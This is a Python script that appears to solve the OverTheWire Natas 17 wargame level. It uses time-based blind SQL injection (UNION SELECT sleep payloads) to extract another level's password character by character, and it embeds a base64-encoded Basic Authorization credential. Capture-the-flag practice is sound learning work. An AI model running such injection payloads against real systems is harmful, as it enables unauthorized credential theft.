# OverTheWire Natas 17

import requests
from string import ascii_letters, digits
import time

# URL and headers
url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
# Update with correct credentials
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://natas17.natas.labs.overthewire.org",
    "Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==",
    "Connection": "keep-alive",
    "Referer": "http://natas17.natas.labs.overthewire.org/",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Sec-GPC": "1"
}

# Characters to try in the password
characters = ascii_letters + digits
password = ""


def check_password_complete(password):
    payload = f'a1d2m3i4n5" union select sleep(5),2 from users where username="natas18" and password="{
        password}";-- -'
    params = {"username": payload}

    seconds_before = time.time()
    response = requests.get(url, headers=headers, params=params)
    seconds_after = time.time()

    return seconds_after-seconds_before > 2


while True:
    found_char = False
    for char in characters:
        test_password = password + char
        payload = f'a1d2m3i4n5" union select sleep(5),2 from users where username="natas18" and password like binary "{
            test_password}%";-- -'
        params = {"username": payload}

        seconds_before = time.time()
        response = requests.get(url, headers=headers, params=params)
        seconds_after = time.time()

        if seconds_after-seconds_before > 2:
            password += char
            found_char = True
            print(f"Current password: {password}")

            # Check if the password is complete
            if check_password_complete(password):
                print(f"Full password found: {password}")
                found_char = False
                break

    if not found_char:
        print("Finished password brute-forcing.")
        break
